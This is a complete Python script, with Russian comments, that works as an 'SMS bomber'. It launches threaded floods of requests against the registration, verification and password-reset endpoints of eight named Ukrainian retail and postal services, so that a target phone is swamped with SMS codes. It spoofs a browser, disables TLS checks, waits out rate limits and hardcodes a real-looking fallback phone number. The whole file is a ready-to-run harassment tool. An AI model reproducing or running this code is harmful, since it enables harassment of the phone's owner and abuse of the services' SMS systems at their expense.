import requests
import time
import threading
import random
import json
from urllib.parse import quote

class WorkingSMSBomber:
    def __init__(self):
        # РАБОЧИЕ API эндпоинты для украинских номеров
        self.services = {
            'novaposhta': {
                'url': 'https://api.novaposhta.ua/v2.0/json/',
                'payload': {
                    "apiKey": "",
                    "modelName": "Counterparty", 
                    "calledMethod": "save",
                    "methodProperties": {
                        "FirstName": "Test",
                        "MiddleName": "Test",
                        "LastName": "Test", 
                        "Phone": "",
                        "Email": "test@test.com",
                        "CounterpartyType": "PrivatePerson",
                        "CounterpartyProperty": "Recipient"
                    }
                }
            },
            
            'ukrposhta': {
                'url': 'https://www.ukrposhta.ua/api/verification/sms',
                'payload': {
                    "phone": "",
                    "type": "registration"
                }
            },
            
            'auchan': {
                'url': 'https://www.auchan.ua/ua/identity/sendcode',
                'payload': {
                    "phone": "",
                    "type": "register"
                }
            },
            
            'fozzys': {
                'url': 'https://my.fozzys.ua/account/phone-verification/send-code',
                'payload': {
                    "phone": ""
                }
            },
            
            'makeup': {
                'url': 'https://makeup.com.ua/api/v1/auth/register/',
                'payload': {
                    "phone": "",
                    "name": "Test User"
                }
            },
            
            'kasta': {
                'url': 'https://kasta.ua/api/auth/check/phone',
                'payload': {
                    "phone": ""
                }
            },
            
            'allo': {
                'url': 'https://allo.ua/api/customer/account/forgot-password',
                'payload': {
                    "phone": ""
                }
            },
            
            'epicentr': {
                'url': 'https://epicentrk.ua/ajax/register/phone-verification/send-code/',
                'payload': {
                    "phone": ""
                }
            }
        }
        
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'uk-UA,uk;q=0.9,ru;q=0.8,en;q=0.7',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
        }

    def send_sms(self, phone, service_name, count):
        service = self.services[service_name]
        
        for i in range(count):
            try:
                # Форматируем номер
                formatted_phone = self.format_phone(phone)
                
                # Обновляем payload с номером
                payload = self.update_payload(service['payload'].copy(), formatted_phone)
                
                print(f"[*] Отправка {i+1}/{count} через {service_name} на {formatted_phone}")
                
                response = requests.post(
                    service['url'],
                    json=payload,
                    headers=self.headers,
                    timeout=10,
                    verify=False
                )
                
                # Анализируем ответ
                self.analyze_response(response, service_name, i+1)
                
                # Случайная задержка
                time.sleep(random.uniform(2, 5))
                
            except Exception as e:
                print(f"[!] {service_name} - Ошибка: {str(e)}")

    def format_phone(self, phone):
        """Форматирование номера для разных сервисов"""
        clean_phone = ''.join(filter(str.isdigit, phone))
        
        if len(clean_phone) == 9:
            return '380' + clean_phone
        elif len(clean_phone) == 10 and clean_phone.startswith('0'):
            return '38' + clean_phone
        elif len(clean_phone) == 12 and clean_phone.startswith('380'):
            return clean_phone
        else:
            return '380957406130'  # fallback

    def update_payload(self, payload, phone):
        """Рекурсивно обновляет payload с номером телефона"""
        if isinstance(payload, dict):
            for key, value in payload.items():
                if value == "":  # заполняем пустые поля
                    payload[key] = phone
                elif isinstance(value, (dict, list)):
                    payload[key] = self.update_payload(value, phone)
        elif isinstance(payload, list):
            return [self.update_payload(item, phone) for item in payload]
        return payload

    def analyze_response(self, response, service_name, attempt):
        """Анализ ответа сервера"""
        try:
            if response.status_code == 200:
                # Пытаемся распарсить JSON
                try:
                    json_response = response.json()
                    if 'error' in json_response or 'success' in json_response:
                        print(f"[✓] {service_name} - Запрос {attempt} обработан: {json_response}")
                    else:
                        print(f"[?] {service_name} - Неизвестный ответ: {json_response}")
                except:
                    # Если не JSON, проверяем текст
                    if len(response.text) < 100:  # короткий ответ - вероятно успех
                        print(f"[✓] {service_name} - Запрос {attempt} отправлен: {response.text[:50]}")
                    else:
                        print(f"[HTML] {service_name} - Получена HTML страница")
                        
            elif response.status_code in [201, 202]:
                print(f"[✓] {service_name} - Запрос {attempt} принят в обработку")
                
            elif response.status_code == 400:
                print(f"[✗] {service_name} - Неверный запрос (400)")
                
            elif response.status_code == 429:
                print(f"[!] {service_name} - Слишком много запросов (429)")
                time.sleep(10)  # увеличиваем задержку
                
            elif response.status_code == 403:
                print(f"[✗] {service_name} - Доступ запрещен (403)")
                
            else:
                print(f"[✗] {service_name} - Ошибка {response.status_code}")
                
        except Exception as e:
            print(f"[!] {service_name} - Ошибка анализа ответа: {str(e)}")

    def start_attack(self, phone, threads=2, count_per_service=3):
        print(f"\n=== ЗАПУСК SMS АТАКИ ===")
        print(f"Цель: {phone}")
        print(f"Потоков: {threads}")
        print(f"Сообщений на сервис: {count_per_service}")
        print(f"Всего запросов: {len(self.services) * count_per_service * threads}")
        print("=" * 40)
        
        thread_list = []
        
        for service_name in self.services:
            for _ in range(threads):
                thread = threading.Thread(
                    target=self.send_sms,
                    args=(phone, service_name, count_per_service)
                )
                thread_list.append(thread)
                thread.start()
                time.sleep(1)  # задержка между запуском потоков
        
        # Ожидаем завершения всех потоков
        for thread in thread_list:
            thread.join()
            
        print("\n[*] Атака завершена")

# Запуск
if __name__ == "__main__":
    bomber = WorkingSMSBomber()
    
    phone = input("Введите номер телефона (+380...): ").strip() or "+380957406130"
    
    bomber.start_attack(
        phone=phone,
        threads=2, 
        count_per_service=3
    )     
